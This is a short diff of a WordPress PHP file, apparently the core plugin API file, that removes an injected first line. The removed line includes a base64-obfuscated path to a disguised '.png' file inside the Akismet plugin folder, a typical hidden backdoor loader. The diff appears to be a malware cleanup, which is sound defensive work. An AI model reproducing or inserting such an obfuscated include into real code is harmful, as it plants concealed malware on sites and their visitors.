@@ -1,4 +1,4 @@
-<?php @include base64_decode("L3Zhci93d3cvc2ltb25uZWVsbGVfZGUvd29yZHByZXNzL3dwLWNvbnRlbnQvcGx1Z2lucy9ha2lzbWV0L19pbmMvaW1nL2xvZ28tbnBvcW5wc3FxcHAucG5n");?><?php
+<?php
 /**
  * The plugin API is located in this file, which allows for creating actions
  * and filters and hooking functions, and methods. The functions or methods will
